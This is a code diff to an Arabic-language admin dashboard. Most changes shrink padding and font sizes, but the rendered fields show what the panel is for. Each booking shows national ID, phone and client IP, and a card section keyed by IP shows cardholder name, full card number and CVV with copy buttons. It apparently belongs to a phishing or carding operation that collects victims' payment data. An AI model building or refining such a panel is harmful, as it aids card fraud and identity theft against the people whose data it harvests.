@@ -209,7 +209,7 @@ tbody tr:hover td { background: #fafbfc; }
   box-shadow: 0 20px 50px rgba(0,0,0,0.25); direction: rtl; margin: auto;
 }
 .modal-header {
-  padding: 14px 18px; border-bottom: 1px solid #f1f5f9;
+  padding: 10px 14px; border-bottom: 1px solid #f1f5f9;
   display: flex; align-items: center; justify-content: space-between;
   border-radius: 16px 16px 0 0;
 }
@@ -223,12 +223,12 @@ tbody tr:hover td { background: #fafbfc; }
 }
 .modal-close:hover { background: #e2e8f0; }
 .modal-close svg { width: 16px; height: 16px; }
-.modal-body { padding: 14px 18px; }
+.modal-body { padding: 10px 14px; }
 
 /* Modal sections */
-.msec { margin-bottom: 14px; }
+.msec { margin-bottom: 10px; }
 .msec-title {
-  font-size: 11px; font-weight: 700; color: #64748b; margin-bottom: 8px;
+  font-size: 10px; font-weight: 700; color: #64748b; margin-bottom: 6px;
   display: flex; align-items: center; gap: 6px; text-transform: uppercase; letter-spacing: 0.5px;
 }
 .msec-title-icon { width: 20px; height: 20px; border-radius: 6px; display: flex; align-items: center; justify-content: center; }
@@ -240,7 +240,7 @@ tbody tr:hover td { background: #fafbfc; }
 .mfield-grid { background: #f8fafc; border-radius: 14px; padding: 4px 0; }
 .mfield {
   display: flex; align-items: center; justify-content: space-between;
-  padding: 8px 14px; border-bottom: 1px solid #f1f5f9;
+  padding: 6px 12px; border-bottom: 1px solid #f1f5f9;
 }
 .mfield:last-child { border-bottom: none; }
 .mfield-label { font-size: 11px; color: #64748b; font-weight: 600; }
@@ -261,7 +261,7 @@ tbody tr:hover td { background: #fafbfc; }
 .card-box.has-card { border-color: #7c3aed; }
 .card-box-header {
   display: flex; align-items: center; justify-content: space-between;
-  padding: 12px 16px; background: #fafafa; border-bottom: 1px solid #f1f5f9;
+  padding: 8px 12px; background: #fafafa; border-bottom: 1px solid #f1f5f9;
 }
 .card-box-title {
   font-size: 13px; font-weight: 700; display: flex; align-items: center; gap: 6px;
@@ -281,7 +281,7 @@ tbody tr:hover td { background: #fafbfc; }
   display: flex; gap: 0; border-top: 1px solid #f1f5f9;
 }
 .card-info-cell {
-  flex: 1; padding: 10px 16px; border-left: 1px solid #f1f5f9;
+  flex: 1; padding: 7px 12px; border-left: 1px solid #f1f5f9;
 }
 .card-info-cell:last-child { border-left: none; }
 .card-info-cell label { font-size: 10px; color: #94a3b8; font-weight: 700; display: block; margin-bottom: 3px; text-transform: uppercase; }
@@ -821,11 +821,9 @@ function buildModalContent(booking, extraData) {
     <div class="mfield-grid">
       <div class="mfield"><span class="mfield-label">الاسم</span><span class="mfield-value">${booking.name || '-'}</span></div>
       <div class="mfield"><span class="mfield-label">رقم الهوية</span><span class="mfield-value">${booking.national_id || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">رقم الهاتف</span><span class="mfield-value">${booking.phone_number || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">الجنسية</span><span class="mfield-value">${booking.nationality || '-'}</span></div>
+      <div class="mfield"><span class="mfield-label">الهاتف</span><span class="mfield-value">${booking.phone_number || '-'}</span></div>
       <div class="mfield"><span class="mfield-label">المنطقة</span><span class="mfield-value">${booking.region || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">IP العميل</span><span class="mfield-value">${booking.ip || '-'}</span></div>
-      <div class="mfield"><span class="mfield-label">الحالة</span><span class="mfield-value"><span class="badge ${sc}">${sl}</span></span></div>
+      <div class="mfield"><span class="mfield-label">IP</span><span class="mfield-value">${booking.ip || '-'}</span></div>
     </div>
   </div>`;
 
@@ -894,15 +892,15 @@ function buildCardSection(ip, extraData) {
     const cvv = cardData.cvv || '-';
 
     html += `
-      <div style="padding:14px 16px;border-bottom:1px solid #f1f5f9">
-        <div style="font-size:11px;color:#94a3b8;font-weight:700;margin-bottom:6px;text-transform:uppercase">اسم الحامل</div>
-        <div style="font-size:16px;font-weight:800;color:#1e293b;display:flex;align-items:center;gap:8px">
+      <div style="padding:8px 12px;border-bottom:1px solid #f1f5f9">
+        <div style="font-size:10px;color:#94a3b8;font-weight:700;margin-bottom:4px;text-transform:uppercase">اسم الحامل</div>
+        <div style="font-size:13px;font-weight:800;color:#1e293b;display:flex;align-items:center;gap:8px">
           ${holderName}
           <button class="copy-btn" onclick="copyText('${holderName}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
         </div>
       </div>
-      <div style="padding:14px 16px;border-bottom:1px solid #f1f5f9">
-        <div style="font-size:11px;color:#94a3b8;font-weight:700;margin-bottom:6px;text-transform:uppercase">رقم البطاقة</div>
+      <div style="padding:8px 12px;border-bottom:1px solid #f1f5f9">
+        <div style="font-size:10px;color:#94a3b8;font-weight:700;margin-bottom:4px;text-transform:uppercase">رقم البطاقة</div>
         <div style="display:flex;align-items:center;gap:8px">
           <span class="card-number-display">${cardNum}</span>
           <button class="copy-btn" onclick="copyText('${rawNum}')"><svg fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"/></svg></button>
